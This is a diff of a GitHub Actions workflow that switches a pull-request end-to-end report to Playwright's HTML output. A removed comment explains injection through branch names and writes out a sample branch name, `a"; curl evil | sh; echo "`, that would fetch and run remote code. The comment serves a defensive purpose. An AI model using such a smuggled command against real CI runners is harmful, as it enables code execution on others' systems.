@@ -1,8 +1,8 @@
 name: e2e report (PR)
 
-# Publishes a browsable report for every pull request: results, plus whatever
-# screenshots the tests recorded, at one URL a reviewer can open on a phone.
-# Runs the `e2e-ci` make target; the contract is in docs/E2E-REPORTS.md.
+# Publishes Playwright's HTML report for every pull request at one URL a
+# reviewer can open on a phone: results per browser, the screenshots the tests
+# attach, and traces for failures. Runs the `e2e-ci` make target.
 on:
   pull_request:
 
@@ -19,7 +19,6 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 25
     env:
-      E2E_ARTIFACTS: ${{ github.workspace }}/artifacts
       # Job level, not step level: the secrets context is rejected in a step's
       # `if`, and a step's own env block is not visible to its own condition.
       # Runner logs mask the value.
@@ -33,38 +32,18 @@ jobs:
           go-version: '1.26'
           cache: true
 
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 'lts/*'
+          cache: npm
+          cache-dependency-path: e2e/package-lock.json
+
       # A failing suite is the case a report matters most for, so the result is
       # recorded here and the job is failed at the very end instead.
       - name: Run e2e
         id: tests
         continue-on-error: true
-        run: |
-          mkdir -p "$E2E_ARTIFACTS"
-          make e2e-ci
-
-      # HEAD_REF arrives through env, never through ${{ }} interpolation. A
-      # branch name is attacker-controlled on a fork PR, and ${{ }} is
-      # substituted into the shell SOURCE before it runs, so interpolating it
-      # directly would let a branch named `a"; curl evil | sh; echo "` execute
-      # in the runner. Via env it is only ever a variable's value. The PR
-      # number is safe either way (an integer), but the reference stays here
-      # so the next editor sees which values are untrusted.
-      - name: Render report
-        if: always()
-        env:
-          HEAD_REF: ${{ github.event.pull_request.head.ref }}
-        run: |
-          python3 scripts/render_test_report.py \
-            --junit results.xml \
-            --artifacts "$E2E_ARTIFACTS" \
-            --out report \
-            --title "hostthis e2e - PR #${{ github.event.pull_request.number }}" \
-            --commit "$GITHUB_SHA" \
-            --branch "$HEAD_REF" \
-            --pr "${{ github.event.pull_request.number }}" \
-            --repo "$GITHUB_REPOSITORY" \
-            --reproduce "make e2e-ci" \
-            --run-url "$GITHUB_SERVER_URL/$GITHUB_REPOSITORY/actions/runs/$GITHUB_RUN_ID"
+        run: make e2e-ci
 
       - name: Upload artifacts
         if: always()
@@ -72,9 +51,8 @@ jobs:
         with:
           name: e2e-report-pr${{ github.event.pull_request.number }}-${{ github.run_attempt }}
           path: |
-            report/
-            artifacts/
-            results.xml
+            e2e/playwright-report/
+            e2e/test-results/
           if-no-files-found: warn
           retention-days: 30
 
@@ -107,7 +85,7 @@ jobs:
           # the step dies before any diagnostic below it runs. stderr is kept:
           # discarding it turns a real failure into a blank variable.
           set +e
-          tar czf - -C report . | hh hostthis.dev $slug > upload.out 2> upload.err
+          tar czf - -C e2e/playwright-report . | hh hostthis.dev $slug > upload.out 2> upload.err
           rc=$?
           set -e
           echo "ssh exit: $rc"
@@ -147,7 +125,6 @@ jobs:
             echo "| --- | --- |"
             echo "| report | ${{ steps.publish.outputs.url || 'not published; see the report artifact' }} |"
             echo "| commit | \`${GITHUB_SHA:0:8}\` |"
-            echo "| screenshots | $(find "$E2E_ARTIFACTS" -name '*.png' 2>/dev/null | wc -l | tr -d ' ') |"
           } >> "$GITHUB_STEP_SUMMARY"
 
       # The suite's own result decides the job, after the report exists.
